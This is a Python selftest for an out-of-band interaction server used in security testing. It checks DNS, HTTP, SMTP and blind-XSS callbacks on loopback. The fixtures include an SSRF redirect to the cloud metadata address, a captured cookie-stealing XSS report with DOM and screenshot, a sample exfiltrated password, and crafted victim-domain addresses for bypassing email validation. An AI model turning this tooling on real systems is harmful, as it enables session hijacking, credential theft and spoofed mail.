"""End-to-end local selftest — no domain, no root, no external services.

Boots every listener on ephemeral 127.0.0.1 ports and drives all channels through the
public interfaces and the control API: register -> DNS hit -> HTTP hit -> upload/fetch
-> XSS callback -> SMTP delivery -> poll/mail/xss -> cross-channel correlation, plus an
auth check. This is the runnable proxy for the on-VPS verification steps in the plan.
"""
from __future__ import annotations

import asyncio
import smtplib
import tempfile
from email.message import EmailMessage
from urllib.parse import quote

import aiohttp
from dnslib import DNSRecord

from .config import Config
from .server import Server

DOMAIN = "oob.test"


class _Check:
    def __init__(self):
        self.results: list[tuple[bool, str]] = []

    def ok(self, cond, label):
        self.results.append((bool(cond), label))
        mark = "PASS" if cond else "FAIL"
        print(f"  [{mark}] {label}")
        return bool(cond)

    @property
    def passed(self):
        return all(c for c, _ in self.results)


async def _dns_query(name: str, port: int) -> list[str]:
    def query():
        pkt = DNSRecord.question(name, "A").send("127.0.0.1", port, tcp=False, timeout=3)
        resp = DNSRecord.parse(pkt)
        return [str(rr.rdata) for rr in resp.rr if rr.rtype == 1]  # A records
    return await asyncio.to_thread(query)


def _send_mail(port: int, to_addr: str, link: str) -> None:
    msg = EmailMessage()
    msg["From"] = "noreply@target.example"
    msg["To"] = to_addr
    msg["Subject"] = "Confirm your account"
    msg.set_content(f"Welcome! Confirm here: {link}\nThanks.")
    with smtplib.SMTP("127.0.0.1", port, timeout=5) as s:
        s.send_message(msg)


async def run_selftest() -> bool:
    tmp = tempfile.mkdtemp(prefix="oobox-selftest-")
    c = Config()
    c.domain = DOMAIN
    c.ipv4 = "127.0.0.1"
    c.bind_host = "127.0.0.1"
    c.api_bind_host = "127.0.0.1"
    c.dns_port = c.http_port = c.smtp_port = c.api_port = 0  # ephemeral
    c.https_port = 0
    c.api_key = "selftest-key-0123456789abcdef"
    c.db_path = f"{tmp}/oobox.db"
    c.files_dir = f"{tmp}/hosted"
    c.ttl_days = 7

    server = Server(c)
    await server.start()
    # reflect actual bound ports back into config so API-built URLs are coherent
    c.dns_port = server.dns.port
    c.http_port = server.http.http_port
    c.smtp_port = server.smtp.port
    c.api_port = server.api.port

    chk = _Check()
    api = f"http://127.0.0.1:{c.api_port}"
    hdr = {"Authorization": f"Bearer {c.api_key}"}

    try:
        async with aiohttp.ClientSession() as sess:
            # --- auth: unauthenticated call refused ---
            async with sess.get(f"{api}/tokens") as r:
                chk.ok(r.status == 401, f"control API refuses no-key call (got {r.status})")

            # --- register ---
            async with sess.post(f"{api}/register", headers=hdr,
                                 json={"note": "selftest"}) as r:
                reg = await r.json()
            token = reg["token"]
            chk.ok(r.status == 200 and token, f"register minted token {token}")
            host = f"{token}.{DOMAIN}"
            hurl = f"http://127.0.0.1:{c.http_port}"

            # --- DNS ---
            answers = await _dns_query(host, c.dns_port)
            chk.ok("127.0.0.1" in answers, f"DNS A {host} -> {answers}")
            apex_soa = await asyncio.to_thread(
                lambda: DNSRecord.parse(
                    DNSRecord.question(DOMAIN, "SOA").send("127.0.0.1", c.dns_port, timeout=3)
                ).rr)
            chk.ok(any(rr.rtype == 6 for rr in apex_soa), "DNS SOA at apex")

            # --- HTTP catcher ---
            async with sess.get(f"{hurl}/pwned?x=1", headers={"Host": host}) as r:
                body = await r.text()
            chk.ok(r.status == 200 and body.strip() == "ok", "HTTP catcher benign 200")

            # non-GET request body is captured verbatim (any method); use a dedicated
            # label so the primary token's ledger stays intact for the cursor fixture.
            exfil = "secret=exfil-42&pw=hunter2"
            async with sess.put(f"{hurl}/leak?id=1&id=2&x=a",
                                headers={"Host": f"bodycap.{DOMAIN}"}, data=exfil) as r:
                chk.ok(r.status == 200, "HTTP catcher benign 200 on PUT")
            async with sess.get(f"{api}/poll?token=bodycap", headers=hdr) as r:
                bc = await r.json()
            put_hit = next((i for i in bc["interactions"]
                            if i["detail"].get("method") == "PUT"), None)
            chk.ok(put_hit is not None and put_hit["detail"].get("body") == exfil,
                   "HTTP catcher stores request body regardless of method")
            # repeated query keys survive via the raw query string (dict() would drop one)
            chk.ok(put_hit is not None
                   and put_hit["detail"].get("query_string") == "id=1&id=2&x=a",
                   "HTTP catcher stores raw query string incl. repeated params")

            # --- file host ---
            svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'
            async with sess.post(
                    f"{api}/upload?token={token}&path=/p.svg",
                    headers={**hdr, "Content-Type": "image/svg+xml"}, data=svg) as r:
                up = await r.json()
            chk.ok(r.status == 200 and up["url"].endswith("/p.svg"), "upload payload")
            async with sess.get(f"{hurl}/p.svg", headers={"Host": host}) as r:
                served = await r.read()
                ctype = r.headers.get("Content-Type", "")
            chk.ok(served == svg and "svg" in ctype, "file host serves exact bytes")

            # --- edit + delete (on a dedicated label so the primary token's
            #     interaction ledger stays intact for the pagination fixture below) ---
            fl_host = f"filelife.{DOMAIN}"
            v1 = b"first-body"
            async with sess.post(f"{api}/upload?token=filelife&path=/e.txt",
                                 headers={**hdr, "Content-Type": "text/plain"}, data=v1) as r:
                chk.ok(r.status == 200, "upload file for edit/delete")
            v2 = b"second-body-longer"
            async with sess.post(f"{api}/upload?token=filelife&path=/e.txt",
                                 headers={**hdr, "Content-Type": "text/html"}, data=v2) as r:
                chk.ok(r.status == 200, "edit re-host overwrites file")
            async with sess.get(f"{hurl}/e.txt", headers={"Host": fl_host}) as r:
                served2 = await r.read()
                ctype2 = r.headers.get("Content-Type", "")
            chk.ok(served2 == v2 and "html" in ctype2,
                   "file host serves edited bytes + content-type")
            async with sess.get(f"{api}/file?token=filelife&path=/e.txt", headers=hdr) as r:
                raw = await r.read()
            chk.ok(r.status == 200 and raw == v2, "control API serves raw file for editing")

            async with sess.delete(f"{api}/files?token=filelife&path=/e.txt", headers=hdr) as r:
                chk.ok(r.status == 200, "delete hosted file")
            async with sess.get(f"{api}/files?token=filelife", headers=hdr) as r:
                flist = await r.json()
            chk.ok(all(f["path"] != "/e.txt" for f in flist["files"]),
                   "deleted file no longer listed")
            async with sess.get(f"{hurl}/e.txt", headers={"Host": fl_host}) as r:
                gone = await r.read()
            chk.ok(gone != v2, "public host stops serving deleted file")
            async with sess.delete(f"{api}/files?token=filelife&path=/e.txt", headers=hdr) as r:
                chk.ok(r.status == 404, "delete of missing file 404s")

            # --- programmable HTTP responses (SSRF/open-redirect/XXE staging) ---
            rhost = f"resp.{DOMAIN}"
            # redirect rule, no body
            async with sess.post(
                    f"{api}/upload?token=resp&path=/go"
                    "&redirect=https://169.254.169.254/latest/meta-data/&status=302",
                    headers=hdr, data=b"") as r:
                chk.ok(r.status == 200, "upload redirect rule")
            async with sess.get(f"{hurl}/go", headers={"Host": rhost},
                                allow_redirects=False) as r:
                loc = r.headers.get("Location", "")
                chk.ok(r.status == 302 and loc.endswith("/latest/meta-data/"),
                       "redirect rule returns 302 + Location")
            # status + custom header + served body
            async with sess.post(
                    f"{api}/upload?token=resp&path=/teapot&status=418"
                    "&header=" + quote("X-Brew: earl-grey"),
                    headers={**hdr, "Content-Type": "text/plain"},
                    data=b"short and stout") as r:
                chk.ok(r.status == 200, "upload status+header rule")
            async with sess.get(f"{hurl}/teapot", headers={"Host": rhost}) as r:
                tbody = await r.read()
                chk.ok(r.status == 418 and r.headers.get("X-Brew") == "earl-grey"
                       and tbody == b"short and stout",
                       "status+header rule serves custom status/header/body")
            # per-token catch-all "/*" applies to any unmatched path
            async with sess.post(
                    f"{api}/upload?token=respcat&path=/*"
                    "&redirect=https://example.com/&status=307",
                    headers=hdr, data=b"") as r:
                chk.ok(r.status == 200, "upload catch-all rule")
            async with sess.get(f"{hurl}/anything/else",
                                headers={"Host": f"respcat.{DOMAIN}"},
                                allow_redirects=False) as r:
                chk.ok(r.status == 307
                       and r.headers.get("Location") == "https://example.com/",
                       "catch-all /* rule applies to any path")
            # a reserved path can't be shadowed by a rule
            async with sess.post(f"{api}/upload?token=resp&path=/c.js&redirect=https://x/",
                                 headers=hdr, data=b"") as r:
                chk.ok(r.status == 400, "reserved path rejected as rule")
            # rule hits are logged as file interactions carrying the applied rule
            async with sess.get(f"{api}/poll?token=resp&kind=file", headers=hdr) as r:
                rp = await r.json()
            chk.ok(any(i["detail"].get("rule", {}).get("redirect")
                       for i in rp["interactions"]),
                   "programmable rule hit logged with rule detail")

            # --- XSS collector ---
            report = {"uri": "https://admin.target.example/panel",
                      "cookies": "session=abc", "dom": "<html>secret</html>"}
            async with sess.post(f"{hurl}/c", headers={"Host": host},
                                 data=__import__("json").dumps(report)) as r:
                chk.ok(r.status == 200, "XSS callback accepted")
            async with sess.get(f"{api}/xss?token={token}", headers=hdr) as r:
                xl = await r.json()
            chk.ok(len(xl["reports"]) == 1, "XSS report stored")
            rid = xl["reports"][0]["id"]
            async with sess.get(f"{api}/xss/{rid}?token={token}", headers=hdr) as r:
                xr = await r.json()
            chk.ok(xr["detail"].get("cookies") == "session=abc", "XSS report has captured data")

            # --- html2canvas served + screenshot attach ---
            async with sess.get(f"{hurl}/h2c.js", headers={"Host": host}) as r:
                h2c = await r.text()
            chk.ok(r.status == 200 and "html2canvas" in h2c, "html2canvas served at /h2c.js")
            shot = "data:image/jpeg;base64,/9j/4AAQSkZJRg=="
            async with sess.post(f"{hurl}/c", headers={"Host": host},
                                 data=__import__("json").dumps(
                                     {"attach": rid, "uri": report["uri"], "screenshot": shot})) as r:
                at = await r.json()
            chk.ok(at.get("ok") and at.get("attached") == rid, "screenshot attach accepted")
            async with sess.get(f"{api}/xss/{rid}?token={token}", headers=hdr) as r:
                xr2 = await r.json()
            chk.ok(xr2["detail"].get("screenshot") == shot, "screenshot merged into report")

            # --- spidered/additional page ingestion ---
            page = {"page": "https://admin.target.example/users", "status": 200,
                    "title": "Users", "dom": "<html>user list</html>", "depth": 1, "parent": rid}
            async with sess.post(f"{hurl}/c", headers={"Host": host},
                                 data=__import__("json").dumps(page)) as r:
                pj = await r.json()
            chk.ok(r.status == 200 and pj.get("page_id"), "spidered page accepted")
            async with sess.get(f"{api}/pages?token={token}", headers=hdr) as r:
                pl = await r.json()
            chk.ok(len(pl["pages"]) == 1 and pl["pages"][0]["url"].endswith("/users")
                   and pl["pages"][0]["depth"] == 1, "page listed with url + depth")
            async with sess.get(f"{api}/pages/{pl['pages'][0]['id']}?token={token}", headers=hdr) as r:
                pg = await r.json()
            chk.ok(pg["detail"].get("dom") == "<html>user list</html>" and pg["parent"] == rid,
                   "page detail has DOM + parent report link")

            # --- SMTP catch-all ---
            link = f"https://target.example/verify?tok={token}"
            await asyncio.to_thread(_send_mail, c.smtp_port, f"{token}@{DOMAIN}", link)
            await asyncio.sleep(0.2)
            async with sess.get(f"{api}/mail?token={token}", headers=hdr) as r:
                ml = await r.json()
            chk.ok(len(ml["emails"]) == 1, "email received under token")
            if ml["emails"]:
                mid = ml["emails"][0]["id"]
                async with sess.get(f"{api}/mail/{mid}?token={token}", headers=hdr) as r:
                    mr = await r.json()
                chk.ok(link in mr["detail"].get("links", []), "email link extracted")
                raw = mr["detail"].get("raw", "")
                chk.ok("Subject: Confirm your account" in raw and link in raw,
                       "raw RFC822 message captured (headers + body)")

            # --- plus-tag routing ---
            await asyncio.to_thread(_send_mail, c.smtp_port, f"{token}+signup@{DOMAIN}",
                                    "https://target.example/x")
            await asyncio.sleep(0.2)
            async with sess.get(f"{api}/mail?token={token}", headers=hdr) as r:
                ml2 = await r.json()
            chk.ok(len(ml2["emails"]) == 2, "plus-tag mail routes to same token")

            # --- outbound send (disabled → 403, then relay loopback to our own MX) ---
            async with sess.post(f"{api}/send", headers=hdr,
                                 json={"token": token, "to": "x@y.test"}) as r:
                chk.ok(r.status == 403, "send refused while OOB_SMTP_SEND is off")
            c.smtp_send = True
            c.smtp_relay = f"127.0.0.1:{c.smtp_port}"   # deliver via our own catch-all
            async with sess.post(f"{api}/register", headers=hdr,
                                 json={"note": "recipient"}) as r:
                token2 = (await r.json())["token"]
            async with sess.post(f"{api}/send", headers=hdr,
                                 json={"token": token, "to": f"{token2}@{DOMAIN}",
                                       "subject": "hi from oob", "body": "test body"}) as r:
                sres = await r.json()
            chk.ok(r.status == 200 and sres["result"].get("ok"),
                   "outbound send delivered (relay loopback)")
            await asyncio.sleep(0.3)
            async with sess.get(f"{api}/mail?token={token2}", headers=hdr) as r:
                rec = await r.json()
            chk.ok(len(rec["emails"]) == 1 and f"{token}@{DOMAIN}" == rec["emails"][0]["mail_from"],
                   "sent mail arrived at recipient token, From = sender token")
            async with sess.get(f"{api}/sent?token={token}", headers=hdr) as r:
                sl = await r.json()
            chk.ok(len(sl["sent"]) == 1 and sl["sent"][0]["mail_to"] == f"{token2}@{DOMAIN}",
                   "sent mail recorded under sender token")

            # --- poll interactions ---
            async with sess.get(f"{api}/poll?token={token}", headers=hdr) as r:
                pl = await r.json()
            kinds = {i["kind"] for i in pl["interactions"]}
            chk.ok({"dns", "http", "file"} <= kinds, f"poll shows all kinds {sorted(kinds)}")

            # --- overview (dashboard data) ---
            async with sess.get(f"{api}/overview", headers=hdr) as r:
                ov = await r.json()
            row = next((t for t in ov["tokens"] if t["token"] == token), None)
            chk.ok(row is not None and row["counts"]["total"] >= 5,
                   "overview lists token with counts")

            # --- sidebar pagination + search ---
            for i in range(5):
                async with sess.post(f"{api}/register", headers=hdr,
                                     json={"name": f"paget{i}", "note": f"pagination probe {i}"}) as r:
                    await r.json()
            async with sess.get(f"{api}/overview?limit=2", headers=hdr) as r:
                p1 = await r.json()
            chk.ok(len(p1["tokens"]) == 2 and p1["total"] >= 6,
                   f"overview paginates (limit=2, total={p1['total']})")
            async with sess.get(f"{api}/overview?q=pagination", headers=hdr) as r:
                sq = await r.json()
            chk.ok(sq["total"] == 5 and all("paget" in t["token"] for t in sq["tokens"]),
                   "overview search matches token/note")

            # --- per-token main-window pagination (before-cursor, newest-first) ---
            async with sess.get(f"{api}/poll?token={token}&limit=2&before={2**62}", headers=hdr) as r:
                pp1 = await r.json()
            ids1 = [i["id"] for i in pp1["interactions"]]
            chk.ok(len(pp1["interactions"]) == 2 and pp1["next_before"]
                   and ids1 == sorted(ids1, reverse=True),
                   "poll paginates 2/page, newest-first, with next_before")
            async with sess.get(f"{api}/poll?token={token}&limit=2&before={pp1['next_before']}",
                                headers=hdr) as r:
                pp2 = await r.json()
            chk.ok(len(pp2["interactions"]) >= 1 and pp2["next_before"] is None,
                   "poll 'load more' returns older rows then ends")

            # --- dashboard cookie login ---
            async with sess.get(f"{api}/", allow_redirects=False) as r:
                chk.ok(r.status == 302 and r.headers.get("Location") == "/login",
                       "unauthenticated dashboard redirects to /login")
            # unsafe=True: aiohttp's jar drops cookies for bare-IP hosts (127.0.0.1) by
            # default; a real browser on the real domain has no such restriction.
            async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as browser:
                async with browser.post(f"{api}/login", data={"key": c.api_key},
                                        allow_redirects=False) as r:
                    setc = r.headers.get("Set-Cookie", "")
                    chk.ok(r.status == 302 and "oobox_session=" in setc, "login sets session cookie")
                async with browser.get(f"{api}/") as r:
                    page = await r.text()
                chk.ok(r.status == 200 and "<title>oobox</title>" in page,
                       "dashboard served to logged-in browser (cookie auth)")
                async with browser.get(f"{api}/overview") as r:
                    chk.ok(r.status == 200, "cookie authenticates the JSON API too")
                async with browser.post(f"{api}/login", data={"key": "wrong"},
                                        allow_redirects=False) as r:
                    chk.ok(r.status == 200 and "Invalid key" in await r.text(),
                           "wrong key is rejected at login")

            # --- correlation ---
            async with sess.get(f"{api}/lookup?token={token}", headers=hdr) as r:
                lk = await r.json()
            counts = lk["counts"]
            chk.ok(counts["dns"] >= 1 and counts["http"] >= 1 and counts["file"] >= 1
                   and counts["mail"] == 2 and counts["xss"] == 1 and counts["pages"] == 1,
                   f"lookup correlates all channels {counts}")
            chk.ok(lk["note"] == "selftest", "lookup returns the injection-point note")

            # --- global activity feed (all tokens) ---
            async with sess.get(f"{api}/feed?limit=100", headers=hdr) as r:
                fd = await r.json()
            kinds_seen = {e["kind"] for e in fd["events"]}
            tokens_seen = {e["token"] for e in fd["events"]}
            chk.ok({"dns", "http", "file", "mail", "xss", "page"} <= kinds_seen,
                   f"feed merges all kinds across tokens {sorted(kinds_seen)}")
            chk.ok(len(tokens_seen) >= 2, f"feed spans multiple tokens {tokens_seen}")
            ts_list = [e["ts"] for e in fd["events"]]
            chk.ok(ts_list == sorted(ts_list, reverse=True), "feed is newest-first")
            async with sess.get(f"{api}/feed?kind=xss", headers=hdr) as r:
                fx = await r.json()
            chk.ok(all(e["kind"] == "xss" for e in fx["events"]) and fx["events"],
                   "feed kind filter works")

            # --- global DNS zone config ---
            async with sess.get(f"{api}/zone", headers=hdr) as r:
                z0 = await r.json()
            chk.ok(z0["effective"]["domain"] == DOMAIN and z0["effective"]["ipv4"] == "127.0.0.1",
                   "zone GET returns effective config")
            async with sess.post(f"{api}/zone", headers=hdr,
                                 json={"ttl": 99, "ipv4": "9.9.9.9", "mx_host": "mail.oob.test"}) as r:
                z1 = await r.json()
            chk.ok(z1["effective"]["ttl"] == 99 and z1["effective"]["ipv4"] == "9.9.9.9"
                   and z1["effective"]["mx_host"] == "mail.oob.test", "zone override saved + reflected")
            async with sess.post(f"{api}/zone/records", headers=hdr,
                                 json={"name": "custom", "type": "A", "value": "10.9.8.7"}) as r:
                chk.ok(r.status == 200, "custom A record added")
            async with sess.post(f"{api}/zone/records", headers=hdr,
                                 json={"name": "@", "type": "TXT", "value": "v=spf1 -all"}) as r:
                chk.ok(r.status == 200, "custom TXT record at apex added")
            async with sess.post(f"{api}/zone/records", headers=hdr,
                                 json={"type": "A", "value": "not-an-ip"}) as r:
                chk.ok(r.status == 400, "invalid A value rejected")
            async with sess.get(f"{api}/zone", headers=hdr) as r:
                zr = await r.json()
            names = {(x["name"], x["type"]) for x in zr["records"]}
            chk.ok((f"custom.{DOMAIN}", "A") in names and (DOMAIN, "TXT") in names,
                   "records listed (custom + apex TXT)")

            # DNS reflects overrides + custom records once the responder cache refreshes
            await asyncio.sleep(2.2)
            wild = await _dns_query(f"anything.{DOMAIN}", c.dns_port)
            chk.ok(wild == ["9.9.9.9"], f"wildcard A now uses override 9.9.9.9 (got {wild})")
            cust = await _dns_query(f"custom.{DOMAIN}", c.dns_port)
            chk.ok(cust == ["10.9.8.7"], f"custom A record wins over wildcard (got {cust})")

            rec_id = next(x["id"] for x in zr["records"] if x["type"] == "A")
            async with sess.delete(f"{api}/zone/records/{rec_id}", headers=hdr) as r:
                chk.ok(r.status == 200, "custom record deleted")

            # --- custom parameter / tag on a blind-XSS report (adds a 2nd report) ---
            tagged = {"uri": "https://t.example/p", "tag": "login-name",
                      "custom": {"tag": "login-name", "field": "email"}, "cookies": "s=1"}
            async with sess.post(f"{hurl}/c", headers={"Host": host},
                                 data=__import__("json").dumps(tagged)) as r:
                tid = (await r.json())["id"]
            async with sess.get(f"{api}/xss?token={token}", headers=hdr) as r:
                xlist = await r.json()
            trow = next((x for x in xlist["reports"] if x["id"] == tid), None)
            chk.ok(trow and trow["tag"] == "login-name", "custom tag stored + listed on report")
            async with sess.get(f"{api}/xss/{tid}?token={token}", headers=hdr) as r:
                tfull = await r.json()
            chk.ok(tfull.get("tag") == "login-name"
                   and (tfull["detail"].get("custom") or {}).get("field") == "email",
                   "custom params preserved in report detail")

            # --- global mailboxes: receive & send at an arbitrary address (bob@, alice@) ---
            await asyncio.to_thread(_send_mail, c.smtp_port, f"alice@{DOMAIN}",
                                    "https://x.example/y")
            await asyncio.sleep(0.2)
            async with sess.get(f"{api}/all/emails", headers=hdr) as r:
                ae = await r.json()
            chk.ok(any(e["token"] == "alice" for e in ae["emails"]),
                   "arbitrary address received under its own label (alice)")
            chk.ok(len({e["token"] for e in ae["emails"]}) >= 2,
                   "global emails span multiple mailboxes")
            async with sess.post(f"{api}/send", headers=hdr,
                                 json={"from": "bob", "to": f"alice@{DOMAIN}",
                                       "subject": "hi", "body": "b"}) as r:
                sb = await r.json()
            chk.ok(r.status == 200 and sb["result"].get("ok") and sb["from"] == f"bob@{DOMAIN}",
                   "send from an arbitrary address bob@ (no token)")
            async with sess.get(f"{api}/sent?token=bob", headers=hdr) as r:
                sbl = await r.json()
            chk.ok(len(sbl["sent"]) == 1, "sent recorded under sender label bob")

            # --- arbitrary-label blind-XSS: callback to hook.<domain> ---
            async with sess.post(f"{hurl}/c", headers={"Host": f"hook.{DOMAIN}"},
                                 data=__import__("json").dumps({"uri": "https://z", "cookies": "c=1"})) as r:
                chk.ok(r.status == 200, "blind-XSS callback under an arbitrary label accepted")
            async with sess.get(f"{api}/all/xss", headers=hdr) as r:
                ax = await r.json()
            chk.ok(any(x["token"] == "hook" for x in ax["reports"]),
                   "arbitrary-label XSS report listed in the global space")

            # --- crafted victim-embedding addresses (email-validation bypass) ---
            async with sess.post(f"{api}/register", headers=hdr, json={"note": "crafted"}) as r:
                vt = (await r.json())["token"]
            async with sess.get(f"{api}/craft?victim=target.example&token={vt}", headers=hdr) as r:
                cr = await r.json()
            by = {a["kind"]: a for a in cr["addresses"]}
            chk.ok(by["local-suffix"]["address"] == f"{vt}.target.example@{DOMAIN}"
                   and by["sub-token-first"]["address"] == f"random@{vt}.target.example.{DOMAIN}",
                   "craft embeds the victim domain in local-part + subdomain shapes")
            chk.ok(all(a["correlates"] == vt for a in cr["addresses"] if a["sendable"]),
                   "crafted sendable addresses correlate back to the token")
            # deliver to a local-part-embed and a subdomain-embed crafted address
            await asyncio.to_thread(_send_mail, c.smtp_port,
                                    by["local-suffix"]["address"], "https://target.example/a")
            await asyncio.to_thread(_send_mail, c.smtp_port,
                                    by["sub-token-first"]["address"], "https://target.example/b")
            await asyncio.sleep(0.3)
            async with sess.get(f"{api}/mail?token={vt}", headers=hdr) as r:
                cm = await r.json()
            chk.ok(len(cm["emails"]) == 2,
                   f"mail to both crafted shapes correlated to the token ({len(cm['emails'])})")

            # tokenless crafted address buckets under a sanitized victim label
            async with sess.get(f"{api}/craft?victim=acme.test", headers=hdr) as r:
                cr0 = await r.json()
            bare = {a["kind"]: a for a in cr0["addresses"]}["local-suffix"]["address"]
            chk.ok(bare == f"acme.test@{DOMAIN}", "tokenless craft is the bare victim embed")
            await asyncio.to_thread(_send_mail, c.smtp_port, bare, "https://acme.test/x")
            await asyncio.sleep(0.2)
            async with sess.get(f"{api}/all/emails", headers=hdr) as r:
                ae2 = await r.json()
            chk.ok(any(e["token"] == "acme-test" for e in ae2["emails"]),
                   "tokenless crafted mail buckets under the sanitized victim label")

            # send FROM a crafted address (from_full), recorded under the embedded token
            async with sess.post(f"{api}/register", headers=hdr, json={"note": "rcpt"}) as r:
                vt2 = (await r.json())["token"]
            async with sess.post(f"{api}/send", headers=hdr,
                                 json={"from_full": by["sub-token-first"]["address"],
                                       "to": f"{vt2}@{DOMAIN}", "subject": "crafted", "body": "b"}) as r:
                sf = await r.json()
            chk.ok(r.status == 200 and sf["result"].get("ok") and sf["label"] == vt,
                   "send from a crafted address delivers, recorded under the embedded token")
            async with sess.post(f"{api}/send", headers=hdr,
                                 json={"from_full": by["quoted-local"]["address"], "to": "x@y.test"}) as r:
                chk.ok(r.status == 400, "send refuses a non-sendable crafted shape (quoted)")
    finally:
        await server.stop()

    print()
    print("SELFTEST", "PASSED" if chk.passed else "FAILED",
          f"({sum(1 for c,_ in chk.results if c)}/{len(chk.results)} checks)")
    return chk.passed
